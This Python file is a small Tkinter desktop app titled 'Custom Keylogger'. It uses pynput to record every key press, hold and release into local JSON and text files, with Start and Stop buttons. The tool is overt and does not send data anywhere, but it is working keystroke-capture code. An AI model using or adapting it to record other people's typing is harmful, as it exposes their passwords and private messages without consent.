import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

pressed_keys = []
is_key_pressed = False
key_combination = ""

def save_text_log(key):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(key)

def save_json_file(pressed_keys):
    with open('key_log.json', 'w') as json_file:
        json.dump(pressed_keys, json_file)

def on_press(key):
    global is_key_pressed, pressed_keys, key_combination
    if not is_key_pressed:
        pressed_keys.append({'Pressed': f'{key}'})
        is_key_pressed = True

    if is_key_pressed:
        pressed_keys.append({'Held': f'{key}'})
    save_json_file(pressed_keys)

def on_release(key):
    global is_key_pressed, pressed_keys, key_combination
    pressed_keys.append({'Released': f'{key}'})
    if is_key_pressed:
        is_key_pressed = False
    save_json_file(pressed_keys)

    key_combination += str(key)
    save_text_log(str(key_combination))

def start_keylogger():
    global key_listener
    key_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    key_listener.start()
    status_label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global key_listener
    key_listener.stop()
    status_label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Custom Keylogger")

status_label = Label(root, text='Click "Start" to begin keylogging.')
status_label.config(anchor=CENTER)
status_label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()
